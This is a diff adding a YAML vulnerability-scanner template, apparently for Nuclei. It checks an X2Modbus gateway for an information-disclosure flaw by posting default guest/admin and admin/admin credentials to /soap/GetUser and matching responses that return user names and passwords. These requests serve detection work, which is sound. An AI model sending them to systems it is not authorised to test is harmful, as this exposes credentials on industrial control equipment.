@@ -1,0 +1,37 @@
+id: X2Modbus-GetUser-Information-disclosure
+
+info:
+  name: X2Modbus-GetUser-Information-disclosure
+  author: xxx
+  severity: medium
+  tags: Information disclosure
+
+http:
+  - raw:
+      - |
+        POST /soap/GetUser HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Content-Type: application/x-www-form-urlencoded
+
+        <GetUser><User Name="guest" Password="admin"/></GetUser>
+      - |
+        POST /soap/GetUser HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Content-Type: application/x-www-form-urlencoded
+
+        <GetUser><User Name="admin" Password="admin"/></GetUser>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<GetUserResult>'
+          - '<UserName>'
+          - '<PassWord>'
+          - '<Date>'
+        condition: and
+      - type: status
+        status: 
+          - 200
